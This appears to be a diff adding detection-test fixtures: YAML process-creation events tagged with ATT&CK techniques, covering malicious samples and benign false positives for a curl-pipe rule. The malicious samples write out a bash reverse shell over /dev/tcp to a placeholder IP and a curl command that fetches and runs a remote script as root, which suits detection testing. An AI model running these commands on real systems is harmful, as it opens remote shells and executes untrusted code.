@@ -1,0 +1,53 @@
+id: SC-L-001
+name: Bash reverse shell over /dev/tcp
+technique: T1059.004
+tactic: execution
+logsource: { category: process_creation, product: linux }
+events:
+  - Image: '/bin/bash'
+    CommandLine: 'bash -c "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"'
+    ParentImage: '/usr/sbin/apache2'
+    User: 'www-data'
+---
+id: SC-L-002
+name: Remote script piped into shell
+technique: T1105
+tactic: command_and_control
+logsource: { category: process_creation, product: linux }
+events:
+  - Image: '/bin/sh'
+    CommandLine: 'sh -c "curl -s http://198.51.100.8/x.sh | bash"'
+    ParentImage: '/usr/sbin/cron'
+    User: 'root'
+---
+id: SC-L-003
+name: Cron job planted for persistence
+technique: T1053.003
+tactic: persistence
+logsource: { category: process_creation, product: linux }
+events:
+  - Image: '/usr/bin/crontab'
+    CommandLine: 'crontab /tmp/.cronfile'
+    ParentImage: '/bin/bash'
+    User: 'root'
+---
+id: SC-LB-001
+name: Developer installs rustup
+note: A normal curl-to-sh install, a realistic false positive for the curl-pipe rule.
+malicious: false
+logsource: { category: process_creation, product: linux }
+events:
+  - Image: '/bin/sh'
+    CommandLine: 'sh -c "curl --proto =https --tlsv1.2 -sSf https://sh.rustup.rs | sh"'
+    ParentImage: '/bin/bash'
+    User: 'dev'
+---
+id: SC-LB-002
+name: Developer downloads an installer without running it
+malicious: false
+logsource: { category: process_creation, product: linux }
+events:
+  - Image: '/usr/bin/curl'
+    CommandLine: 'curl -fsSL https://get.docker.com -o get-docker.sh'
+    ParentImage: '/bin/bash'
+    User: 'dev'
